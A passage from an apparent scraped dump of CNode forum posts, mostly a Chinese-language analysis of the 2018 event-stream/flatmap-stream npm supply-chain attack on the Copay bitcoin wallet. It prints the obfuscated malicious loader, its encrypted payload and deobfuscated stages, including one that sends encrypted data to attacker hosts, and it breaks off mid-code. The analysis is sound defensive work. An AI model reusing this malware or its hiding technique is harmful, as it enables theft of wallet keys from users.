OAuth2</p>\n</div>","title":"l-passport：集成微信、QQ、百度和微博登录于一体的koa中间件","last_reply_at":"2018-12-06T06:25:39.477Z","good":false,"top":false,"reply_count":6,"visit_count":1616,"create_at":"2018-11-16T04:43:19.582Z","author":{"loginname":"zhulinwei","avatar_url":"https://avatars2.githubusercontent.com/u/17670262?v=4&s=120"}},{"id":"5c0546c0d3b8ab334e8da3e3","author_id":"5ba61ea38f5b0c1c59ea10b6","tab":"share","content":"<div class=\"markdown-text\"><h1>ChineseChess</h1>\n<h3>试玩链接：<a href=\"http://htmlpreview.github.io/?https://github.com/xiugangzhang/ChineseChess/blob/master/ChineseChess.html\">http://htmlpreview.github.io/?https://github.com/xiugangzhang/ChineseChess/blob/master/ChineseChess.html</a></h3>\n<h3>备用链接：<a href=\"http://vip.52tech.tech/game/chinesechess/index.html\">http://vip.52tech.tech/game/chinesechess/index.html</a></h3>\n<h2>目前已经实现的功能</h2>\n<ul>\n<li>V1.0 : 实现棋子的布局，画布及游戏场景的初始化</li>\n<li>V2.0 : 实现棋子的颜色改变</li>\n<li>V3.0 ：实现所有象棋的走棋规则</li>\n<li>V4.0 : 实现所有棋子的吃子功能（测试中）</li>\n</ul>\n<h3>使用HTML5中的Canvas画布技术实现了一个中国象棋项目，目前还有bug，还在测试……</h3>\n<p><img src=\"//static.cnodejs.org/FuhlNTfnD381C7sMz3fLcgoG02e1\" alt=\"00.jpg\"></p>\n<p>GItHub源码：<a href=\"https://github.com/xiugangzhang/ChineseChess\">https://github.com/xiugangzhang/ChineseChess</a></p>\n</div>","title":"使用HTML5开发的一个中国象棋小游戏","last_reply_at":"2018-12-06T04:36:32.531Z","good":false,"top":false,"reply_count":2,"visit_count":1056,"create_at":"2018-12-03T15:07:44.410Z","author":{"loginname":"xiugangzhang","avatar_url":"https://avatars3.githubusercontent.com/u/29092258?v=4&s=120"}},{"id":"5c0499ab887c5864fafe1e31","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p>如果你是JavaScript或者区块链开发者，如果你有关注区块链以及比特币，那么你应该听说了比特币钱包<a href=\"https://copay.io/\">Copay</a>被黑客攻击的事情。但是，你知道这是怎么回事吗？</p>\n<h3>总结</h3>\n<ul>\n<li>比特币钱包<a href=\"https://github.com/bitpay/copay\">copay</a>依赖<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块；</li>\n<li>黑客从骗取了<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块的npm发布权限；</li>\n<li>黑客为<a href=\"https://github.com/dominictarr/event-stream\">event-stream</a>模块添加了依赖<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>；</li>\n<li><a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>含有黑客代码，仅会在<a href=\"https://github.com/bitpay/copay\">copay</a>项目中正确执行，窃取用户的密码、私钥等信息，从而盗取比特币；</li>\n<li>有人说什么Vue可能遭受攻击，其实没有这回事，因为黑客代码只会在<a href=\"https://github.com/bitpay/copay\">copay</a>项目中正确执行。只有<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json\">package.json</a>中的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>字符串&quot;A Secure Bitcoin Wallet&quot;能够解密黑客代码；而且，黑客的代码是为<a href=\"https://github.com/bitpay/copay\">copay</a>量身定做的，对其他项目没有作用；再说，黑客是来窃取的比特币的，又不是挖矿，你的项目有比特币给人家偷吗?</li>\n</ul>\n<h3>Q&amp;A</h3>\n<ul>\n<li>哪个版本的<a href=\"https://github.com/bitpay/copay\">copay</a>被攻击了？<strong>5.0.2到5.1.0</strong></li>\n<li>哪个版本的<a href=\"https://www.npmjs.com/package/event-stream\">event-stream</a>被攻击了？<strong>3.3.6</strong></li>\n<li>哪个版本的<a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>被攻击了？<strong>0.1.1</strong></li>\n<li>Vue会受到攻击吗？<strong>不会</strong></li>\n</ul>\n<p>另外，欢迎大家免费试用<a href=\"https://www.fundebug.com/\">Fundebug</a>的错误监控服务哈~</p>\n<h3>寻找flatmap-stream中的黑客代码</h3>\n<p><a href=\"https://www.npmjs.com/package/flatmap-stream\">flatmap-stream</a>已经被npm删除了，不过还能在<a href=\"https://unpkg.com/#/\">UNPKG</a>上找到代码：<a href=\"https://unpkg.com/flatmap-stream@0.1.1/index.min.js\">https://unpkg.com/flatmap-stream@0.1.1/index.min.js</a></p>\n<p><strong>index.min.js</strong>是经过压缩的代码，因此可读性很差：</p>\n<pre class=\"prettyprint language-javascript\"><code>var Stream=require(&quot;stream&quot;).Stream;module.exports=function(e,n){var i=new Stream,a=0,o=0,u=!1,f=!1,l=!1,c=0,s=!1,d=(n=n||{}).failures?&quot;failure&quot;:&quot;error&quot;,m={};function w(r,e){var t=c+1;if(e===t?(void 0!==r&amp;&amp;i.emit.apply(i,[&quot;data&quot;,r]),c++,t++):m[e]=r,m.hasOwnProperty(t)){var n=m[t];return delete m[t],w(n,t)}a===++o&amp;&amp;(f&amp;&amp;(f=!1,i.emit(&quot;drain&quot;)),u&amp;&amp;v())}function p(r,e,t){l||(s=!0,r&amp;&amp;!n.failures||w(e,t),r&amp;&amp;i.emit.apply(i,[d,r]),s=!1)}function b(r,t,n){return e.call(null,r,function(r,e){n(r,e,t)})}function v(r){if(u=!0,i.writable=!1,void 0!==r)return w(r,a);a==o&amp;&amp;(i.readable=!1,i.emit(&quot;end&quot;),i.destroy())}return i.writable=!0,i.readable=!0,i.write=function(r){if(u)throw new Error(&quot;flatmap stream is not writable&quot;);s=!1;try{for(var e in r){a++;var t=b(r[e],a,p);if(f=!1===t)break}return!f}catch(r){if(s)throw r;return p(r),!f}},i.end=function(r){u||v(r)},i.destroy=function(){u=l=!0,i.writable=i.readable=f=!1,process.nextTick(function(){i.emit(&quot;close&quot;)})},i.pause=function(){f=!0},i.resume=function(){f=!1},i};!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,&quot;hex&quot;).toString()}var n=r(e(&quot;2e2f746573742f64617461&quot;)),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,&quot;&quot;),f.exports(n[1])}catch(r){}}();\n</code></pre><p>但是，黑客的黑客代码<strong>隐藏的并不深</strong>，直接添加在<strong>index.min.js</strong>的后面：</p>\n<pre class=\"prettyprint language-javascript\"><code>!function(){try{var r=require,t=process;function e(r){return Buffer.from(r,&quot;hex&quot;).toString()}var n=r(e(&quot;2e2f746573742f64617461&quot;)),o=t[e(n[3])][e(n[4])];if(!o)return;var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));var f=new module.constructor;f.paths=module.paths,f[e(n[7])](a,&quot;&quot;),f.exports(n[1])}catch(r){}}();\n</code></pre><p>使用<a href=\"https://unminify.com/\">unminify</a>将黑客代码还原：</p>\n<pre class=\"prettyprint language-javascript=\"><code>! function() {\n    try {\n        var r = require,\n            t = process;\n\n        function e(r) {\n            return Buffer.from(r, &quot;hex&quot;).toString()\n        }\n        var n = r(e(&quot;2e2f746573742f64617461&quot;)),\n            o = t[e(n[3])][e(n[4])];\n        if (!o) return;\n        var u = r(e(n[2]))[e(n[6])](e(n[5]), o),\n            a = u.update(n[0], e(n[8]), e(n[9]));\n        a += u.final(e(n[9]));\n        var f = new module.constructor;\n        f.paths = module.paths, f[e(n[7])](a, &quot;&quot;), f.exports(n[1])\n    } catch (r) {}\n}();\n</code></pre><p>这段代码其实很短，黑客混淆的方式并不高明，我们可以一步一步还原。</p>\n<ul>\n<li>使用<strong>require</strong>替换变量<strong>r</strong></li>\n<li>使用<strong>process</strong>替换变量<strong>t</strong></li>\n<li>函数<strong>e</strong>任务很简单，就是把16进制字符串转为ASCII字符串，因此更名为hexToAscii</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>!(function() {\n    try {\n        function hexToAscii(r) {\n            return Buffer.from(r, &quot;hex&quot;).toString();\n        }\n        var n = require(hexToAscii(&quot;2e2f746573742f64617461&quot;)),\n            o = process[hexToAscii(n[3])][hexToAscii(n[4])];\n        if (!o) return;\n        var u = require(hexToAscii(n[2]))[hexToAscii(n[6])](\n                hexToAscii(n[5]),\n                o\n            ),\n            a = u.update(n[0], hexToAscii(n[8]), hexToAscii(n[9]));\n        a += u.final(hexToAscii(n[9]));\n        var f = new module.constructor();\n        (f.paths = module.paths), f[hexToAscii(n[7])](a, &quot;&quot;), f.exports(n[1]);\n    } catch (r) {\n        &#x2F;&#x2F; 忽略报错\n    }\n})();\n</code></pre><p>很明显，黑客使用hexToAscii函数是为了混淆代码，比如hexToAscii(“2e2f746573742f64617461”)其实就是**./test/data**，因此数组<strong>n</strong>即为：<a href=\"https://unpkg.com/flatmap-stream@0.1.1/test/data\">https://unpkg.com/flatmap-stream@0.1.1/test/data.js</a>，这个data文件已经找不到了，根据<a href=\"https://github.com/dominictarr/event-stream/issues/116#issue-382854428\">FallingSnow</a>之前的分析，它是一个数组：</p>\n<pre class=\"prettyprint language-javascript\"><code>[\n    &quot;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629&quot;,\n    &quot;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1&quot;,\n    &quot;63727970746f&quot;,\n    &quot;656e76&quot;,\n    &quot;6e706d5f7061636b6167655f6465736372697074696f6e&quot;,\n    &quot;616573323536&quot;,\n    &quot;6372656174654465636970686572&quot;,\n    &quot;5f636f6d70696c65&quot;,\n    &quot;686578&quot;,\n    &quot;75746638&quot;\n]\n</code></pre><p>数组<strong>n</strong>中一共有10个元素，除了前面2个元素，其他元素在代码中均通过hexToAscii函数进行了转换，其转换结果如下:</p>\n<ul>\n<li>hexToAscii(n[2]): crypto</li>\n<li>hexToAscii(n[3]): env</li>\n<li>hexToAscii(n[4]): npm_package_description</li>\n<li>hexToAscii(n[5]): aes256</li>\n<li>hexToAscii(n[6]): createDecipher</li>\n<li>hexToAscii(n[7]): _compile</li>\n<li>hexToAscii(n[8]): hex</li>\n<li>hexToAscii(n[9]): utf8</li>\n</ul>\n<p>将这些值全部替换掉，代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>!(function() {\n    try {\n        var n = [\n            &quot;75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629&quot;,\n            &quot;db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1&quot;\n        ];\n        var o = process[&quot;env&quot;][&quot;npm_package_description&quot;];\n        if (!o) return;\n        var u = require(&quot;crypto&quot;)[&quot;createDecipher&quot;](&quot;aes256&quot;, o),\n            a = u.update(n[0], &quot;hex&quot;, &quot;utf8&quot;);\n        a += u.final(&quot;utf8&quot;);\n        var f = new module.constructor();\n        (f.paths = module.paths), f[&quot;_compile&quot;](a, &quot;&quot;), f.exports(n[1]);\n    } catch (r) {\n        &#x2F;&#x2F; 忽略报错\n    }\n})();\n</code></pre><p>代码中使用了<a href=\"https://nodejs.org/api/crypto.html#crypto_crypto_createdecipher_algorithm_password_options\">crypto.createDecipher</a>函数，其文档如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>crypto.createDecipher(algorithm, password)\n&#x2F;&#x2F; Creates and returns a Decipher object that uses the given algorithm and password\n</code></pre><p>可知，代码将项目的npm_package_description作为密码来解密<strong>n[0]<strong>字符串，而<a href=\"https://github.com/bitpay/copay\">copay</a>项目的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json\">package.json</a>的<a href=\"https://github.com/bitpay/copay/blob/cd3f2b380588e6bc90e6c498bf9ae075bcc59e34/package.json#L3\">description</a>属性是</strong>&quot;A Secure Bitcoin Wallet&quot;</strong>，&quot;恰好&quot;可以成功解密n[0]字符串，<a href=\"https://unminify.com/\">unminify</a>之后如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;*@@*&#x2F;\nmodule.exports = function(e) {\n    try {\n        if (!&#x2F;build\\:.*\\-release&#x2F;.test(process.argv[2])) return;\n        var t = process.env.npm_package_description,\n            r = require(&quot;fs&quot;),\n            i = &quot;.&#x2F;node_modules&#x2F;@zxing&#x2F;library&#x2F;esm5&#x2F;core&#x2F;common&#x2F;reedsolomon&#x2F;ReedSolomonDecoder.js&quot;,\n            n = r.statSync(i),\n            c = r.readFileSync(i, &quot;utf8&quot;),\n            o = require(&quot;crypto&quot;).createDecipher(&quot;aes256&quot;, t),\n            s = o.update(e, &quot;hex&quot;, &quot;utf8&quot;);\n        s = &quot;\\n&quot; + (s += o.final(&quot;utf8&quot;));\n        var a = c.indexOf(&quot;\\n&#x2F;*@@*&#x2F;&quot;);\n        0 &lt;= a &amp;&amp; (c = c.substr(0, a)), r.writeFileSync(i, c + s, &quot;utf8&quot;), r.utimesSync(i, n.atime, n.mtime), process.on(&quot;exit&quot;, function() {\n            try {\n                r.writeFileSync(i, c, &quot;utf8&quot;), r.utimesSync(i, n.atime, n.mtime)\n            } catch (e) {}\n        })\n    } catch (e) {}\n};\n</code></pre><p>我们在解密的代码中看到了完全一样的套路，只是这次解密的是<strong>n[1]</strong>，<a href=\"https://unminify.com/\">unminify</a>之后如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x2F;*@@*&#x2F; ! function() {\n    function e() {\n        try {\n            var o = require(&quot;http&quot;),\n                a = require(&quot;crypto&quot;),\n                c = &quot;-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs&#x2F;peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+&#x2F;BiGud7b77Fwfq372fUuEIk\\n2P&#x2F;pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw&#x2F;6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl&#x2F;cJ&#x2F;x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----&quot;;\n\n            function i(e, t, n) {\n                e = Buffer.from(e, &quot;hex&quot;).toString();\n                var r = o.request({\n                    hostname: e,\n                    port: 8080,\n                    method: &quot;POST&quot;,\n                    path: &quot;&#x2F;&quot; + t,\n                    headers: {\n                        &quot;Content-Length&quot;: n.length,\n                        &quot;Content-Type&quot;: &quot;text&#x2F;html&quot;\n                    }\n                }, function() {});\n                r.on(&quot;error&quot;, function(e) {}), r.write(n), r.end()\n            }\n\n            function r(e, t) {\n                for (var n = &quot;&quot;, r = 0; r &lt; t.length; r += 200) {\n                    var o = t.substr(r, 200);\n                    n += a.publicEncrypt(c, Buffer.from(o, &quot;utf8&quot;)).toString(&quot;hex&quot;) + &quot;+&quot;\n                }\n                i(&quot;636f7061796170692e686f7374&quot;, e, n), i(&quot;3131312e39302e3135312e313334&quot;, e, n)\n            }\n\n            function 